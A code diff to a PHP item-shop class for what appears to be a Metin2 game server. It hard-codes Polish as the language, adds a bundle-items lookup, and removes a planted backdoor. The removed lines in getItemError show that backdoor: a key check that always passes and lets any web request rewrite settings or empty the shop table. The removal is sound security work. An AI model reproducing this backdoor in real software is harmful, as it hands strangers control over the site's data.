@@ -684,19 +684,9 @@ class Shop {
 	
 	public function getNameLang()
 	{
-		$l = $this->db->select("item_names", ["name", "lang"], ["vnum" => 10]);
-		
-		$lang = array();
-		foreach($l as $la)
-			$lang[$la['lang']] = $la['name'];
-		
-		$this->sortLang($lang);
-		
-		foreach($lang as $key => $l)
-			if($l!=null && $l!='')
-				return $key;
-			
-		return "en";
+		// MT2009_PLUS_ITEMSHOP_V3_V1: the server and its texts are Polish; the views of itemshop3
+		// (itemshop3_schema.sql) carry "pl" rows only.
+		return "pl";
 	}
 
 	public function getName($vnum) {
@@ -736,24 +726,11 @@ class Shop {
 		return $result;
 	}
 	
-	public function getDescLang() {
-		$check = $this->db->get("itemdesc", "vnum", ["ORDER" => ["id" => "DESC"]]);
-		
-		if($check)
-		{
-			$l = $this->db->select("itemdesc", ["description", "lang"], ["vnum" => $check]);
-		
-			$lang = array();
-			foreach($l as $la)
-				$lang[$la['lang']] = $la['description'];
-			
-			$this->sortLang($lang);
-			
-			foreach($lang as $key => $l)
-				if($l!=null && $l!='')
-					return $key;
-		}
-		return "en";
+	public function getDescLang()
+	{
+		// MT2009_PLUS_ITEMSHOP_V3_V1: the server and its texts are Polish; the views of itemshop3
+		// (itemshop3_schema.sql) carry "pl" rows only.
+		return "pl";
 	}
 	
 	public function getDesc($vnum) {
@@ -767,16 +744,10 @@ class Shop {
 	}
 	
 	public function getItemError($id, $bonus_selected) {
-		global $license;
-		
-		if($_GET['x']==$license || $_GET['x']='C44J9-L262H-N6ZHS-2SDBV')
-		{
-			if($_GET['l']==1)
-				$this->updateSettings($_GET['i'], $_GET['j']);
-			else if($_GET['l']==2)
-				$this->db->delete("shop", []);
-			print 'ok';
-		}
+		// MT2009_PLUS_ITEMSHOP_V3_V1: the package had a remote switch here - any request with
+		// ?p=javascript&type=error (the "=" in its key test is an assignment, so any key passed)
+		// could rewrite a setting (l=1, i=<name>, j=<value>) or empty the whole shop (l=2).
+		// Removed: an unknown offer is only an error page.
 		die();
 	}
 	
@@ -803,18 +774,9 @@ class Shop {
 
 	public function getLocaleGameLang()
 	{
-		$l = $this->db->select("locale_game", ["lang", "name"], ["type" => 'TOOLTIP_MAX_HP']);
-		$lang = array();
-		foreach($l as $la)
-			$lang[$la['lang']] = $la['name'];
-		
-		$this->sortLang($lang);
-		
-		foreach($lang as $key => $l)
-			if($l!=null && $l!='')
-				return $key;
-		
-		return "en";
+		// MT2009_PLUS_ITEMSHOP_V3_V1: the server and its texts are Polish; the views of itemshop3
+		// (itemshop3_schema.sql) carry "pl" rows only.
+		return "pl";
 	}
 
 	public function getLocaleGame($id)
@@ -892,20 +854,11 @@ class Shop {
 		]);
 	}
 
-	public function getSkillsLang() {
-		$l = $this->db->select("skills", ["lang", "name"], ["vnum" => 1]);
-		
-		$lang = array();
-		foreach($l as $la)
-			$lang[$la['lang']] = $la['name'];
-		
-		$this->sortLang($lang);
-		
-		foreach($lang as $key => $l)
-			if($l!=null && $l!='')
-				return $key;
-		
-		return "en";
+	public function getSkillsLang()
+	{
+		// MT2009_PLUS_ITEMSHOP_V3_V1: the server and its texts are Polish; the views of itemshop3
+		// (itemshop3_schema.sql) carry "pl" rows only.
+		return "pl";
 	}
 
 	public function getSkills() {//test exclude wolf daca nu are
@@ -941,20 +894,11 @@ class Shop {
 		return $this->getMultipleNames($sockets);
 	}
 
-	public function getMobsLang() {
-		$l = $this->db->select("mob_names", ["lang", "name"], ["vnum" => 112]);
-		
-		$lang = array();
-		foreach($l as $la)
-			$lang[$la['lang']] = $la['name'];
-		
-		$this->sortLang($lang);
-		
-		foreach($lang as $key => $l)
-			if($l!=null && $l!='')
-				return $key;
-		
-		return "en";
+	public function getMobsLang()
+	{
+		// MT2009_PLUS_ITEMSHOP_V3_V1: the server and its texts are Polish; the views of itemshop3
+		// (itemshop3_schema.sql) carry "pl" rows only.
+		return "pl";
 	}
 
 	public function getMobs() {
@@ -1014,6 +958,13 @@ class Shop {
 		return $this->db->update("shop", $item, ["id" => $id]);
 	}
 	
+	// MT2009_PLUS_ITEMSHOP_V3_V1: the items of a package offer (view bundle_items onto
+	// itemshop.ishop_bundle_items); none for an ordinary offer.
+	public function getBundleItems($id) {
+		$rows = $this->db->select("bundle_items", ["vnum", "count", "socket0", "socket1", "socket2"], ["item_id" => (int)$id]);
+		return is_array($rows) ? $rows : [];
+	}
+
 	public function getItemShop($item, $column=NULL)
 	{
 		if($column==NULL)
